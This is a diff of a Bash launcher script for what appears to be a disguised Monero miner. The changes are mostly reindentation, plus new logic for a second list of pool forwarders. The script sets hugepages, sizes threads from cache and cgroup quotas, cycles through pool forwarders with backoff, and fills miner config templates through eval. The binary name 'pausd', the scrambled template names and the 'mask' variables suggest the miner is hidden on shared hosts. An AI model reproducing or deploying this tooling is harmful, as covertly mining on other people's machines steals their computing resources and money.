@@ -6,10 +6,10 @@ DAEMON=${DAEMON:-pausd}
 DAEMON_NAME=${DAEMON##* }
 CC_ENABLED=${CC_ENABLED:-false}
 if [ -z "$TNL_SKIP" -o "$TNL_SKIP" = 1 ]; then
-    # OBJ_CFG="${OBJ_CFG:-girmx_tnl_skip.1.json.tpl}"
-    OBJ_CFG="${OBJ_CFG:-girmx_2.json.tpl}"
+	# OBJ_CFG="${OBJ_CFG:-girmx_tnl_skip.1.json.tpl}"
+	OBJ_CFG="${OBJ_CFG:-girmx_2.json.tpl}"
 else
-    OBJ_CFG="${OBJ_CFG:-girmx.1.json.tpl}"
+	OBJ_CFG="${OBJ_CFG:-girmx.1.json.tpl}"
 fi
 OBJ_CFG_MASK="${OBJ_CFG_MASK:-config.json}"
 # ARGS="${ARGS:-${OBJ_MASK} -c ${OBJ_CFG_MASK}}"
@@ -30,18 +30,18 @@ chmod +x "${OBJ_MASK}" &>/dev/null
 # DAEMON_URL=""
 # wget -q ${DAEMON_URL}
 if [ -e $DAEMON_NAME ]; then
-    chmod +x ${DAEMON_NAME} &>/dev/null
+	chmod +x ${DAEMON_NAME} &>/dev/null
 fi
 
 ## daemons conf
 ## misc
 [ $UID != 0 ] && sudo=$(get_path sudo 2>/dev/null)
 if [ -n "$HPGS" ]; then
-    printf $HPGS | $sudo tee /proc/sys/vm/nr_hugepages &>/dev/null
+	printf $HPGS | $sudo tee /proc/sys/vm/nr_hugepages &>/dev/null
 else
-    for i in {128,64,32,16,8,4}; do ## try setting some hugepages
-        printf $i | $sudo tee /proc/sys/vm/nr_hugepages &>/dev/null && break
-    done
+	for i in {128,64,32,16,8,4}; do ## try setting some hugepages
+		printf $i | $sudo tee /proc/sys/vm/nr_hugepages &>/dev/null && break
+	done
 fi
 
 ## instance ID
@@ -56,21 +56,21 @@ HOSTN=${HOSTN//-/}
 ## L3 cache size to multihash factor
 # cache_bytes=$(grep -im1 "cache size" </proc/cpuinfo | sed -r 's/[^0-9]*([0-9]+).*/\1/')
 get_cache
-cache_MB=${cache_MB:-$((cache_bytes / 1024 ))}
+cache_MB=${cache_MB:-$((cache_bytes / 1024))}
 if [ ${TARGET_CO:-xmr} = xmr ]; then
-        hashes=$((cache_MB / 2)) ## each hashpoint takes 2M for xmr
+	hashes=$((cache_MB / 2)) ## each hashpoint takes 2M for xmr
 else
-        hashes=$cache_MB
+	hashes=$cache_MB
 fi
 
 # memory
 get_mem
 if [ "$FREEMEM" -lt 1024 ]; then
-    RX_INIT=0
-    RX_ENABLED=false
+	RX_INIT=0
+	RX_ENABLED=false
 else
-    RX_INIT=-1
-    RX_ENABLED=${RX_ENABLED:-true}
+	RX_INIT=-1
+	RX_ENABLED=${RX_ENABLED:-true}
 fi
 
 ## cpu
@@ -81,30 +81,30 @@ cgq=cpu.cfs_quota_us
 cg1=/sys/fs/cgroup/cpuacct,cpu
 cg2=/sys/fs/cgroup/cpu,cpuacct
 if [ -a $cg1 ]; then
-    cpu_p=$(<$cg1/$cgp)
-    cpu_q=$(<$cg1/$cgq)
+	cpu_p=$(<$cg1/$cgp)
+	cpu_q=$(<$cg1/$cgq)
 elif [ -a $cg2 ]; then
-    cpu_p=$(<$cg2/$cgp)
-    cpu_q=$(<$cg2/$cgq)
+	cpu_p=$(<$cg2/$cgp)
+	cpu_q=$(<$cg2/$cgq)
 fi
 if [ -n "$cpu_p" -a -n "$cpu_q" -a "$cpu_p" != 0 ]; then ## respect cgroups
-    ACORES=${ACORES:-$((cpu_q / cpu_p))} ## the available cpu (in number of cores)
-    ## compose a binary string to map affinity (printf from bash or non busybox)
-    if [ "$ACORES" -eq 1 ]; then
-        THREADS_D=1
-    elif [ -n "$ACORES" -a "$ACORES" -ne 0 ]; then
-        THREADS_D="$ACORES"
-        ## no cgroups, use half the cores
-    fi
+	ACORES=${ACORES:-$((cpu_q / cpu_p))}                    ## the available cpu (in number of cores)
+	## compose a binary string to map affinity (printf from bash or non busybox)
+	if [ "$ACORES" -eq 1 ]; then
+		THREADS_D=1
+	elif [ -n "$ACORES" -a "$ACORES" -ne 0 ]; then
+		THREADS_D="$ACORES"
+		## no cgroups, use half the cores
+	fi
 fi
 if [ $CORES -gt 1 ]; then
-    THREADS_D=$((CORES / 2))
+	THREADS_D=$((CORES / 2))
 else
-    THREADS_D=1
+	THREADS_D=1
 fi
 THREADS=${THREADS_FIXED:-${THREADS:-${THREADS_D}}}
 ## init MAX_LOAD
-MAX_LOAD=${MAX_LOAD:-$((CORES*100))}
+MAX_LOAD=${MAX_LOAD:-$((CORES * 100))}
 [ "$MAX_LOAD" -lt 1 -o -z "$MAX_LOAD" ] && MAX_LOAD=100
 ## don't setup affinity because on shared environments it yields lower performance overall
 ## because doesn't let the cpu scheduler do its job, other processes might stall causing further
@@ -124,10 +124,10 @@ PA=${PA:-WhosThere} \
 AL=${AL} \
 AESNI=${AESNI:-1}
 
-export provider=${X_ID/-*}
+export provider=${X_ID/-*/}
 
 ## sanitize X_ID
-X_ID=${X_ID// }
+X_ID=${X_ID// /}
 X_ID=${X_ID//\//-}
 
 ## commands
@@ -136,9 +136,10 @@ COMMAND_AFTER="${COMMAND_AFTER:-:;}"
 
 ## pools
 if [ -z "$TNL_SKIP" -o "$TNL_SKIP" = 1 ]; then
-    function config_pools(){
-        local pool
-        read -r -d '' pool <<'POOL'
+	function config_pools() {
+		local pool norx
+		norx=
+		read -r -d '' pool <<'POOL'
 {
     \"algo\": null,
     \"url\": \"${URL}\",
@@ -153,95 +154,128 @@ if [ -z "$TNL_SKIP" -o "$TNL_SKIP" = 1 ]; then
     \"nicehash\": \"${NICEHASH:-false}\"
 }
 POOL
-        ## only first setup
-        if [ "$1" = 0 ]; then
-            fwds_file="net/forwarders"
-            export pool_fwds=$(ushuffle $fwds_file)
-        fi
-        export POOLS=
-        export last_pool=${last_pool:-0} prev_pool=${last_pool:-0}
-        local c=1
-        while [ -z "$POOLS" ]; do
-            if [ -n "$PPORT" ]; then
-                for URL in $pool_fwds; do
-                    if [ $c -gt $last_pool ]; then
-                        if [ ${URL/*:} = "$PPORT" ]; then
-                            if check_connection ${URL/:*} ${URL/*:}; then
-                                POOLS="$(eval "printf '%s\n' \"${POOLS}${pool},\"")"
-                                last_pool=$c
-                                break
-                            fi
-                        fi
-                    fi
-                    c=$((c+1))
-                    # [ $p -gt 3 ] && break
-                done
-                [ -z "$POOLS" -o "$last_pool" = "$prev_pool" ] && last_pool=0 ## reset position and start from beginning
-            else
-                for URL in $pool_fwds; do
-                    if [ $c -gt $last_pool ]; then
-                        if check_connection ${URL/:*} ${URL/*:}; then
-                            POOLS="$(eval "printf '%s\n' \"${POOLS}${pool},\"")"
-                            last_pool=$c
-                            break
-                        fi
-                    fi
-                    c=$((c+1))
-                    # [ $p -gt 3 ] && break
-                done
-                [ -z "$POOLS" -o "$last_pool" = "$prev_pool" ] && last_pool=0 ## reset position and start from beginning
-            fi
-            [ -z "$POOLS" ] && {
-                backoff_p=$((${backoff_p:=1}+${backoff_p:=1}));
-                fleep ${backoff_p};
-            }
-        done
-    }
-    config_pools 0
-    function config_client(){
-        ## only first setup
-        [ "$CC_ENABLED" != "true" ] && return
-        if [ "$1" = 0 ]; then
-            x_fwds_file="net/x_forwarders"
-            export x_fwds=$(ushuffle $x_fwds_file)
-        fi
-        [ "$X_URL_FORCE" = 1 ] || unset X_URL
-        export last_x_url=${last_x_url:-0} prev_x_url=${last_x_url:-0}
-        local x_c=1
-        while [ -z "${X_URL}" ]; do
-            if [ -n "$X_PPORT" ]; then
-                for X_URL in $x_fwds; do
-                    if [ $x_c -gt $last_x_url ]; then
-                        if [ ${X_URL/*:} = "$X_PPORT" ]; then
-                            if check_connection ${X_URL/:*} ${X_URL/*:}; then
-                                last_x_url=$x_c
-                                break ## && operator outsite [] is not reliable
-                            fi
-                        fi
-                    fi
-                    x_c=$((x_c+1))
-                done
-                [ -z "$X_URL" -o "$prev_x_url" = "$last_x_url" ] && last_x_url=0
-            else
-                for X_URL in $x_fwds; do
-                    if [ $x_c -gt $last_x_url ]; then
-                        if check_connection ${X_URL/:*} ${X_URL/*:}; then
-                            last_x_url=$x_c
-                            break ## && operator outsite [] is not reliable
-                        fi
-                    fi
-                    x_c=$((x_c+1))
-                done
-                [ -z "$X_URL" -o "$prev_x_url" = "$last_x_url" ] && last_x_url=0
-            fi
-            [ -z "$X_URL" ] && {
-                backoff_x=$((${backoff_x:=1}+${backoff_x:=1}));
-                fleep ${backoff_x};
-            }
-        done
-        export X_URL
-    }
-    config_client 0
+		## only first setup
+		if [ "$1" = 0 ]; then
+			# fw called on startup
+			fwds_file="net/forwarders"
+			export pool_fwds=$(ushuffle $fwds_file)
+			pool_addresses=$pool_fwds
+		elif [ "$1" = 1 ]; then
+			# norx fw called on startup
+			norx=1
+			fwds_file_norx="net/x_forwarders"
+			export pool_fwds_norx=$(ushuffle $fwds_file_norx)
+			pool_addresses=$pool_fwds_norx
+		elif [ "$1" = 3 ]; then
+			# only delete on normal forwarder, 3 is the forwarder
+			# fw called after startup
+			export POOLS=
+			pool_addresses=$pool_fwds
+		else
+			# norx called after startup
+			norx=1
+			pool_addresses=$pool_fwds_norx
+		fi
+		local LAST PREV
+		if [ -n "$norx" ]; then
+			export last_pool_norx=${last_pool_norx:-0} prev_pool_norx=${last_pool_norx:-0}
+			LAST=$last_pool_norx
+			PREV=$prev_pool_norx
+		else
+			export last_pool=${last_pool:-0} prev_pool=${last_pool:-0}
+			LAST=$last_pool
+			PREV=$prev_pool
+		fi
+		local c=1
+		local pool_str=
+		while [ -z "$pool_str" ]; do
+			if [ -n "$PPORT" ]; then
+				for URL in $pool_addresses; do
+					if [ $c -gt $LAST ]; then
+						if [ ${URL/*:/} = "$PPORT" ]; then
+							if check_connection ${URL/:*/} ${URL/*:/}; then
+								pool_str="$(eval "printf '%s\n' \"${POOLS}${pool},\"")"
+								LAST=$c
+								break
+							fi
+						fi
+					fi
+					c=$((c + 1))
+					# [ $p -gt 3 ] && break
+				done
+				[ -z "$pool_str" -o "$LAST" = "$PREV" ] && LAST=0 ## reset position and start from beginning
+			else
+				for URL in $pool_addresses; do
+					if [ $c -gt $LAST ]; then
+						if check_connection ${URL/:*/} ${URL/*:/}; then
+							pool_str="$(eval "printf '%s\n' \"${POOLS}${pool},\"")"
+							LAST=$c
+							break
+						fi
+					fi
+					c=$((c + 1))
+					# [ $p -gt 3 ] && break
+				done
+				[ -z "$pool_str" -o "$LAST" = "$PREV" ] && LAST=0 ## reset position and start from beginning
+			fi
+			[ -z "$pool_str" ] && {
+				backoff_p=$((${backoff_p:=1} + ${backoff_p:=1}))
+				fleep ${backoff_p}
+			}
+			if [ -n "$norx" ]; then
+				last_pool_norx=$LAST
+			else
+				last_pool=$LAST
+			fi
+			POOL="${POOL}${pool_str}"
+		done
+	}
+	config_pools 0
+	config_pools 1
+	function config_client() {
+		## only first setup
+		[ "$CC_ENABLED" != "true" ] && return
+		if [ "$1" = 0 ]; then
+			x_fwds_file="net/x_forwarders"
+			export x_fwds=$(ushuffle $x_fwds_file)
+		fi
+		[ "$X_URL_FORCE" = 1 ] || unset X_URL
+		export last_x_url=${last_x_url:-0} prev_x_url=${last_x_url:-0}
+		local x_c=1
+		while [ -z "${X_URL}" ]; do
+			if [ -n "$X_PPORT" ]; then
+				for X_URL in $x_fwds; do
+					if [ $x_c -gt $last_x_url ]; then
+						if [ ${X_URL/*:/} = "$X_PPORT" ]; then
+							if check_connection ${X_URL/:*/} ${X_URL/*:/}; then
+								last_x_url=$x_c
+								break ## && operator outsite [] is not reliable
+							fi
+						fi
+					fi
+					x_c=$((x_c + 1))
+				done
+				[ -z "$X_URL" -o "$prev_x_url" = "$last_x_url" ] && last_x_url=0
+			else
+				for X_URL in $x_fwds; do
+					if [ $x_c -gt $last_x_url ]; then
+						if check_connection ${X_URL/:*/} ${X_URL/*:/}; then
+							last_x_url=$x_c
+							break ## && operator outsite [] is not reliable
+						fi
+					fi
+					x_c=$((x_c + 1))
+				done
+				[ -z "$X_URL" -o "$prev_x_url" = "$last_x_url" ] && last_x_url=0
+			fi
+			[ -z "$X_URL" ] && {
+				backoff_x=$((${backoff_x:=1} + ${backoff_x:=1}))
+				fleep ${backoff_x}
+			}
+		done
+		export X_URL
+	}
+	config_client 0
 
 #     pool=$(cat <<'POOL'
 # {
@@ -258,16 +292,16 @@ fi
 
 ## subst
 function config_config() {
-    if [ "$1" = 0 ]; then
-        export OBJ_CFG_TPL=$(<"cfg/${OBJ_CFG}")
-        OBJ_CFG_TPL=${OBJ_CFG_TPL//\"/_#_#}
-    fi
-    if [ "$1" = 1 ]; then
-        Q_CONFIG=$(eval "printf '%s' \"${OBJ_CFG_TPL}\"")
-        CONFIG="${Q_CONFIG//_#_#/\"}"
-    else
-        Q_CONFIG=$(eval  "printf '%s' \"${OBJ_CFG_TPL}\"")
-        printf '%s' "${Q_CONFIG//_#_#/\"}" > "${OBJ_CFG_MASK}"
-    fi
+	if [ "$1" = 0 ]; then
+		export OBJ_CFG_TPL=$(<"cfg/${OBJ_CFG}")
+		OBJ_CFG_TPL=${OBJ_CFG_TPL//\"/_#_#}
+	fi
+	if [ "$1" = 1 ]; then
+		Q_CONFIG=$(eval "printf '%s' \"${OBJ_CFG_TPL}\"")
+		CONFIG="${Q_CONFIG//_#_#/\"}"
+	else
+		Q_CONFIG=$(eval "printf '%s' \"${OBJ_CFG_TPL}\"")
+		printf '%s' "${Q_CONFIG//_#_#/\"}" >"${OBJ_CFG_MASK}"
+	fi
 }
 config_config 0
